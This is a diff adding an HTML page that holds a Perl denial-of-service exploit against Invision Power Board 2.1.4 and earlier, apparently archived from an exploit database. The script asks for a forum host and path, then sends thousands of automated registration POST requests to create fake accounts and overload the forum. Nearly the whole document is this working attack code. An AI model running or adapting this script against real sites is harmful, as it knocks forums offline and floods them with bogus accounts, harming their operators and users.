@@ -1,0 +1,46 @@
+<html><head><title>Invision Power Board <= 2.1.4 (Register Users) Denial of Service Exploit</title></head><pre>#!/usr/bin/perl
+use IO::Socket;
+##########################################################
+##		 _______ _______ ______ 		 #
+##		 |______ |______ |     \		 #
+##		 ______| |______ |_____/		 #
+##		                        		 #
+##IPB Register Multiple Users Denial of Service	   	 #
+##Doesn't Work on forums using &quot;Code Confirmation&quot;	 #
+##Created By SkOd                                        #
+##SED security Team                                      #
+##http://www.sed-team.be                                 #
+##skod.uk@gmail.com                                      #
+##ISRAEL                                                 #
+##########################################################
+
+print q{
+############################################################
+#        Invision Power Board Multiple Users DOS	   #
+#		Tested on IPB 2.0.1			   #
+#	    created By SkOd. SED Security Team             #
+############################################################
+};
+$rand=rand(10);
+print &quot;Forum Host: &quot;;
+$serv = &lt;stdin&gt;;
+chop ($serv);
+print &quot;Forum Path: &quot;;
+$path = &lt;stdin&gt;;
+chop ($path);
+for ($i=0; $i&lt;9999; $i++)
+{
+$name=&quot;sedXPL_&quot;.$rand.$i;
+$data = &quot;act=Reg&amp;CODE=02&amp;coppa_user=0&amp;UserName=&quot;.$name.&quot;&amp;PassWord=sedbotbeta&amp;PassWord_Check=sedbotbeta&amp;EmailAddress=&quot;.$name.&quot;\@host.com&amp;EmailAddress_two=&quot;.$name.&quot;\@host.com&amp;allow_admin_mail=1&amp;allow_member_mail=1&amp;day=11&amp;month=11&amp;year=1985&amp;agree=1&quot;;
+$len = length $data;
+$get1 = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$serv&quot;, PeerPort =&gt; &quot;80&quot;) || die &quot;Cennot Connect Host, it's can be beacuse the host dosed&quot;;
+print $get1 &quot;POST &quot;.$path.&quot;index.php HTTP/1.0\n&quot;;
+print $get1 &quot;Host: &quot;.$serv.&quot;\n&quot;;
+print $get1 &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
+print $get1 &quot;Content-Length: &quot;.$len.&quot;\n\n&quot;;
+print $get1 $data;
+syswrite STDOUT, &quot;+&quot;;
+}
+print &quot;Forum shuld be Dosed. Check it out...\n&quot;;
+
+# milw0rm.com [2006-02-10]</pre></html>
